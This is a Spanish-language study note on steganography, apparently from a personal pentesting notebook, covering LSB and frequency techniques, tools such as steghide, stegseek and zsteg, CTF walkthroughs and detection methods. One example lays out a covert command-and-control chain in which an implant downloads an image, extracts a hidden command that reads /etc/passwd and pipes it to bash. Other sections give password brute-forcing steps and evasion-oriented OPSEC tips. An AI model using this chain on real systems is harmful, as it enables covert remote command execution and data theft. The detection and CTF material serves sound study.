# Esteganografía: Conceptos, Herramientas y Práctica Completa

> **Definición rápida**: Arte y ciencia de ocultar información dentro de otro medio (portador) de forma que su existencia pase desapercibida. A diferencia de la criptografía (oculta el *contenido*), la esteganografía oculta la *existencia misma* del mensaje.

---

## 1. Fundamentos Teóricos

### 1.1 Diferencia clave: Criptografía vs Esteganografía vs Estegoanálisis

| Concepto | Objetivo | Visibilidad |
|----------|----------|-------------|
| **Criptografía** | Proteger el contenido (confidencialidad) | Mensaje visible, ilegible sin clave |
| **Esteganografía** | Ocultar la existencia de la comunicación | Mensaje invisible, portador aparentemente normal |
| **Estegoanálisis** | Detectar y/o extraer información oculta | Análisis forense del portador |

> **Combinación ideal**: Cifrar **primero** (AES, ChaCha20) → luego esteganografiar. Así si detectan el mensaje, sigue siendo ilegible.

### 1.2 Modelo Matemático Básico

```
Portador (Cover) + Mensaje Secreto + Clave (opcional) → Estego-objeto (Stego)
```

- **Cover**: Imagen, audio, video, texto, binario, tráfico de red, etc.
- **Payload**: Datos a ocultar (texto, archivo, shellcode, credenciales)
- **Clave**: Parámetro secreto para embarque/desembarque (seguridad 추가)

### 1.3 Capacidad vs Robustez vs Imperceptibilidad (Triángulo)

```
        Capacidad (cuánto escondes)
              /\
             /  \
            /    \
    Robustez ------ Imperceptibilidad
  (sobrevive a      (indetectable
   compresión,      visual/estadísticamente)
   recorte, ruido)
```

- **Alta capacidad** → más ruido estadístico → más detectable
- **Alta robustez** → redundancia → menor capacidad
- **Alta imperceptibilidad** → cambios mínimos → frágil a transformaciones

---

## 2. Técnicas Principales en Imágenes

### 2.1 Dominio Espacial (LSB - Least Significant Bit)

| Variante | Descripción | Capacidad | Robustez |
|----------|-------------|-----------|----------|
| **LSB 1-bit** | Modifica el bit menos significativo de cada canal (R,G,B) | ~12.5% del tamaño imagen | Muy baja (compresión JPEG la destruye) |
| **LSB n-bits** | Usa 2-4 bits menos significativos | 2-4x más | Menor calidad visual |
| **LSB Randomizado** | Clave semilla PRNG para dispersar bits | Igual | Más difícil detección estadística |
| **PVD (Pixel Value Differencing)** | Adapta bits según diferencia entre píxeles | Variable | Mejor imperceptibilidad |

**Ejemplo LSB 1-bit (RGB 24bpp)**:
```
Píxel original:  R=11010101  G=01101100  B=10011010
Mensaje (bits):  1           0           1
Píxel modificado: R=11010101  G=01101100  B=10011011  (solo LSB de B cambió)
```

### 2.2 Dominio de Frecuencia (Transformadas)

| Técnica | Transformada | Uso típico |
|---------|--------------|------------|
| **DCT** | Discrete Cosine Transform | JPEG (coeficientes AC) |
| **DWT** | Discrete Wavelet Transform | JPEG2000, PNG sin pérdidas |
| **DFT** | Discrete Fourier Transform | Análisis espectral |

**Ventaja**: Sobrevive a compresión lossy (JPEG) si se modifica coeficientes bajos/medios.

### 2.3 Técnicas Basadas en Formato/Metadatos

| Método | Descripción | Ejemplo |
|--------|-------------|---------|
| **Appending** | Datos al final del archivo (EOF) | `cat secreto.txt >> imagen.jpg` |
| **Chunk/Segment injection** | PNG: chunks `tEXt`, `zTXt`, `iTXt`; JPEG: segmentos `APPn` | `exiftool -Comment="datos" img.jpg` |
| **Headers falsos** | Cabeceras válidas pero datos ocultos en padding | Polyglots (archivo válido en 2+ formatos) |

---

## 3. Herramientas Principales

### 3.1 Línea de Comandos (CLI)

| Herramienta | Propósito | Formatos | Instalación |
|-------------|-----------|----------|-------------|
| **stegseek** | **Fuerza bruta de contraseña** en steghide | JPEG, BMP, WAV, AU | `go install github.com/RickdeJager/stegseek@latest` |
| **steghide** | Embed/extract con passphrase + cifrado (AES-256) | JPEG, BMP, WAV, AU | `apt install steghide` |
| **zsteg** | Detector/extract LSB en PNG/BMP (muy rápido) | PNG, BMP | `gem install zsteg` |
| **stegsolve** | GUI Java: análisis bit-planes, canales, metadata | Multi | `java -jar stegsolve.jar` |
| **exiftool** | Leer/escribir metadatos EXIF, IPTC, XMP | Casi todos | `apt install libimage-exiftool-perl` |
| **binwalk** | Análisis firmware/binarios, extrae archivos embebidos | Binarios, imágenes | `apt install binwalk` |
| **foremost/scalpel** | File carving (recuperar archivos por firmas) | Raw, dd images | `apt install foremost` |
| **strings** | Extraer cadenas ASCII/Unicode imprimibles | Cualquier binario | Built-in |
| **xxd / hexdump** | Inspección hexadecimal | Cualquier archivo | Built-in |

### 3.2 Especializadas

| Herramienta | Especialidad |
|-------------|--------------|
| **openstego** | Java CLI/GUI, plugins para algoritmos múltiples |
| **stegonline** | Web (George Omura): LSB, RGB, canales, XOR |
| **steganography-toolkit** | Suite Python (LSB, DCT, espectral) |
| **silenteye** | Qt GUI multiplataforma |
| **deepsteg** | Basado en deep learning (adversarial) |
| **stegcloak** | Esteganografía en texto (Unicode zero-width chars) |

### 3.3 Estegoanálisis (Detección)

| Herramienta | Qué detecta |
|-------------|-------------|
| **stegdetect** | JSteg, OutGuess, F5, invisible secrets en JPEG |
| **stegspy** | Firmas de herramientas conocidas |
| **AI-based** | CNN entrenados (Steganalysis Net, SRNet) |
| **Statistical** | Chi-square, RS Analysis, Sample Pair Analysis (SPA) |

---

## 4. Proceso de Ocultación (Embedding) - Paso a Paso

### 4.1 Preparación del Payload

```bash
# 1. Cifrar primero (RECOMENDADO)
openssl enc -aes-256-cbc -salt -pbkdf2 -in secreto.txt -out secreto.enc
# Ingresa passphrase fuerte

# 2. O comprimir + cifrar
tar -czf datos.tar.gz carpeta_secreta/
openssl enc -aes-256-cbc -salt -pbkdf2 -in datos.tar.gz -out payload.enc
```

### 4.2 Selección del Portador (Cover)

**Criterios de buena cover**:
- ✅ Alta entropía / textura compleja (fotos naturales, ruido)
- ✅ Tamaño suficiente para payload + overhead
- ✅ Formato sin pérdidas (PNG, BMP, TIFF, WAV, FLAC) si usas LSB
- ✅ Evita: capturas de pantalla, gráficos simples, fondos sólidos
- ✅ **Nunca reutilices** la misma cover para múltiples payloads

### 4.3 Embedding con steghide (Ejemplo clásico)

```bash
# Ocultar archivo cifrado en imagen JPEG
steghide embed -cf foto.jpg -ef payload.enc -p "MiPassphraseFuerte123!" -z 9

# Parámetros:
# -cf  cover file (portador)
# -ef  embed file (payload a ocultar)
# -p   passphrase (clave para embarque/desembarque)
# -z   nivel compresión 1-9 (9 = mejor compresión payload antes de ocultar)
# -e   algoritmo cifrado (default: rijndael-256 = AES-256)
# -K   usar clave en vez de passphrase (hex)
# -N   no añadir checksum (más capacidad, menos integridad)
```

### 4.4 Embedding LSB en PNG con zsteg / Python

```bash
# zsteg puede EMBED (solo LSB simple)
zsteg -E "payload.txt" cover.png stego.png

# Python - LSB 1-bit RGB (ejemplo mínimo)
python3 -c "
from PIL import Image
img = Image.open('cover.png')
pixels = img.load()
msg = open('payload.enc','rb').read()
bits = ''.join(f'{b:08b}' for b in msg) + '00000000'  # delimitador null
idx = 0
for y in range(img.height):
    for x in range(img.width):
        if idx >= len(bits): break
        r,g,b = pixels[x,y]
        if idx < len(bits): r = (r & 0xFE) | int(bits[idx]); idx+=1
        if idx < len(bits): g = (g & 0xFE) | int(bits[idx]); idx+=1
        if idx < len(bits): b = (b & 0xFE) | int(bits[idx]); idx+=1
        pixels[x,y] = (r,g,b)
    if idx >= len(bits): break
img.save('stego.png')
"
```

---

## 5. Proceso de Extracción (Extraction) - Paso a Paso

### 5.1 Con steghide (requiere passphrase)

```bash
# Extraer a archivo
steghide extract -sf stego.jpg -xf extraido.enc -p "MiPassphraseFuerte123!"

# Ver info sin extraer
steghide info stego.jpg -p "MiPassphraseFuerte123!"
```

### 5.2 **stegseek** - Fuerza Bruta de Passphrase (Tu caso)

```bash
# Ataque diccionario contra steghide
stegseek --crack stego.jpg /usr/share/wordlists/rockyou.txt

# Con wordlist personalizada
stegseek --crack stego.jpg ./mis_passphrases.txt

# Mostrar passphrase encontrada y extraer automático
stegseek --crack stego.jpg rockyou.txt --extract

# Salida típica:
# [+] Found passphrase: "password123"
# [+] Extracting to "stego.jpg.out"...
```

> **Nota**: stegseek solo funciona con archivos creados por **steghide** (formato propietario con magic bytes `steghide`).

### 5.3 Extracción LSB genérica (sin passphrase)

```bash
# zsteg - prueba automática múltiples configuraciones LSB
zsteg stego.png                    # Análisis completo
zsteg -a stego.png                 # Todos los métodos
zsteg -b 1,2,3,4 -o lsb stego.png  # Bits 1-4, orden lsb

# Extraer payload binario detectado
zsteg -E "b1,rgb,lsb,xy" stego.png > extraido.bin
```

### 5.4 Análisis de Metadatos y Estructura

```bash
# EXIF / comentarios / chunks
exiftool stego.jpg
exiftool -b -Comment stego.jpg > extraido.bin

# PNG chunks sospechosos
pngcheck -v stego.png
# Busca chunks: tEXt, zTXt, iTXt, cUSTOM, etc.

# Binwalk - archivos embebidos
binwalk -e stego.jpg
# Extrae a _stego.jpg.extracted/

# Strings - cadenas legibles
strings stego.jpg | grep -i "flag\|password\|secret"
```

### 5.5 Análisis Visual (StegSolve / stegonline)

1. Abrir `stego.png` en **stegsolve.jar** o **stegonline.com**
2. Revisar **Bit Planes** (Red 0, Green 0, Blue 0 = LSB)
3. Si hay patrón visible/ruido en bit 0 → hay LSB embedding
4. Canales **Alpha** (si RGBA) también usados

---

## 6. Ejemplos Prácticos Completos

### Ejemplo 1: CTF - Imagen con Flag en LSB (PNG)

```bash
# 1. Reconocimiento
file flag.png
# PNG image data, 800 x 600, 8-bit/color RGB, non-interlaced

# 2. zsteg automático
zsteg flag.png
# Output típico:
# b1,rgb,lsb,xy       .. text: "flag{st3g0_1s_fun_123}"

# 3. Extraer directo
zsteg -E "b1,rgb,lsb,xy" flag.png > flag.txt
cat flag.txt
# flag{st3g0_1s_fun_123}
```

### Ejemplo 2: JPEG con steghide + Passphrase Débil (stegseek)

```bash
# 1. Identificar formato steghide
steghide info desafio.jpg
# "steghide 0.5.1 - embedded data: 1024 bytes, encrypted: rijndael-256"

# 2. Fuerza bruta con rockyou
stegseek --crack desafio.jpg /usr/share/wordlists/rockyou.txt
# [+] Found passphrase: "secret123"
# [+] Extracting to "desafio.jpg.out"...

# 3. Ver contenido extraído
file desafio.jpg.out
cat desafio.jpg.out
# flag{...} o archivo binario
```

### Ejemplo 3: Archivo Poliglota (Polyglot) - JPEG + ZIP

```bash
# Crear: JPEG válido que TAMBIÉN es ZIP válido
cat foto.jpg archivo_secreto.zip > polyglot.jpg

# Verificar
file polyglot.jpg      # JPEG image data
unzip -l polyglot.jpg  # Lista contenido ZIP

# Extraer
unzip polyglot.jpg -d extraido/
```

### Ejemplo 4: Exfiltración Realista - C2 via Imagen

```bash
# Atacante: Preparar payload (comando cifrado)
echo "id; hostname; cat /etc/passwd" | openssl enc -aes-256-cbc -pbkdf2 -k "ClaveC2" > cmd.enc

# Embed en imagen legítima del servidor web
steghide embed -cf /var/www/html/banner.jpg -ef cmd.enc -p "ClaveC2" -z 9

# Victima (malware/implant): Descarga imagen, extrae, ejecuta
wget -q https://target.com/banner.jpg -O /tmp/banner.jpg
steghide extract -sf /tmp/banner.jpg -xf /tmp/cmd.enc -p "ClaveC2"
openssl enc -d -aes-256-cbc -pbkdf2 -k "ClaveC2" -in /tmp/cmd.enc | bash
```

---

## 7. Estegoanálisis: Cómo Detectar Esteganografía

### 7.1 Análisis Estadístico (Automatizado)

```bash
# stegdetect - JPEG clásico
stegdetect desafio.jpg
# Output: desafio.jpg : jsteG(??)  <- probable JSteg/OutGuess

# stegspy - firmas de herramientas
stegspy desafio.jpg
```

### 7.2 Análisis Visual (Manual)

| Indicador | Qué buscar |
|-----------|------------|
| **Bit-plane 0 (LSB)** | Ruido aleatorio = normal; Patrones = embedding |
| **Histogramas RGB** | Picos en valores pares/impares (LSB matching) |
| **Pares de valores** | RS Analysis, Chi-square test |
| **Compresión** | Re-comprimir JPEG y comparar tamaños |

### 7.3 Herramientas de Detección Avanzada

```bash
# Python - Chi-square test en LSB
python3 -c "
from PIL import Image
import numpy as np
img = np.array(Image.open('sospechosa.png'))
lsb = img & 1
# Chi-square en cada canal
for c in range(3):
    hist = np.bincount(lsb[:,:,c].flatten(), minlength=2)
    chi2 = sum((hist - hist.mean())**2 / hist.mean())
    print(f'Canal {c}: chi2={chi2:.2f} (>{3.84} = sospechoso p<0.05)')
"
```

---

## 8. Buenas Prácticas OPSEC

| Regla | Por qué |
|-------|---------|
| **Cifra ANTES de esteganografiar** | Defensa en profundidad |
| **Usa covers únicas por operación** | Evita análisis diferencial |
| **Covers con alta entropía natural** | Fotos RAW, ruido de sensor, audio ambiental |
| **Limpia metadata EXIF** | `exiftool -all= imagen.jpg` |
| **Verifica tamaño final** | No debe llamar la atención (ex: 50KB → 50MB) |
| **Prueba extracción ANTES de enviar** | Evita corrupción silenciosa |
| **Considera formato sin pérdidas** | PNG/BMP/TIFF/WAV/FLAC para LSB |
| **Evita herramientas con firmas conocidas** | steghide, openstego dejan headers detectables |

---

## 9. Referencias y Recursos

### Documentación Oficial
- [steghide manual](http://steghide.sourceforge.net/)
- [stegseek GitHub](https://github.com/RickdeJager/stegseek)
- [zsteg GitHub](https://github.com/zed-0xff/zsteg)
- [binwalk docs](https://github.com/ReFirmLabs/binwalk)

### Papers / Artículos Técnicos
- *"Steganography in Digital Images"* - Fridrich et al.
- *"Detecting LSB Steganography in Color Images"* - Ker (2005)
- *"Steganalysis of JPEG Images"* - Pevny et al. (2010)

### Practice / CTF
- [Steganography challenges - OverTheWire](https://overthewire.org/wargames/)
- [Stego challenges - HackTheBox](https://www.hackthebox.com/)
- [CryptoHack - Steganography](https://cryptohack.org/)

### Wordlists para stegseek
```bash
# RockYou (clásica)
/usr/share/wordlists/rockyou.txt.gz

# SecLists (Daniel Miessler)
git clone https://github.com/danielmiessler/SecLists.git
# SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz

# Generar custom
crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789 > custom.txt
```

---

## 10. Checklist Rápida (Cheatsheet)

```
[ ] 1. Identificar formato archivo (file, exiftool, binwalk)
[ ] 2. Buscar strings visibles (strings, grep)
[ ] 3. Analizar metadata (exiftool, pngcheck)
[ ] 4. Probar zsteg (PNG/BMP) - LSB automático
[ ] 5. Probar steghide info (JPEG/BMP/WAV)
[ ] 6. Si steghide + passphrase → stegseek + wordlist
[ ] 7. Binwalk -e (archivos embebidos)
[ ] 8. Análisis visual bit-planes (stegsolve/stegonline)
[ ] 9. Estegoanálisis estadístico (stegdetect, chi-square)
[ ] 10. Documentar hallazgos y herramienta exitosa
```

---

## 11. Estructura de Carpeta Sugerida para tus Notas

```
03 - Ciberseguridad y Pentesting/
├── Esteganografía/
│   ├── Esteganografía - Conceptos, Herramientas y Práctica.md  ← ESTA NOTA
│   ├── Stegseek - Guía Rápida.md
│   ├── Steghide - Uso Avanzado.md
│   ├── Zsteg - Análisis LSB PNG.md
│   ├── Estegoanálisis - Detección y ContraMedidas.md
│   └── Casos Prácticos CTF/
│       ├── LSB Basico.png
│       ├── JPEG Steghide.jpg
│       └── Polyglot JPEG-ZIP.jpg
```

---

> **Nota final**: La esteganografía moderna en entornos reales (malware, APT, exfiltración) suele combinarse con **covert channels** (DNS, HTTP headers, timing, ICMP) y **domain fronting**. Esta nota cubre el vector "archivo estático"; para canales de red ver `Covert Channels` (pendiente de nota propia).

---

*Creado: $(date '+%Y-%m-%d') | Actualizado: $(date '+%Y-%m-%d') | Etiquetas: #esteganografia #forense #ctf #stegseek #steghide #zsteg #lsb #exfiltracion*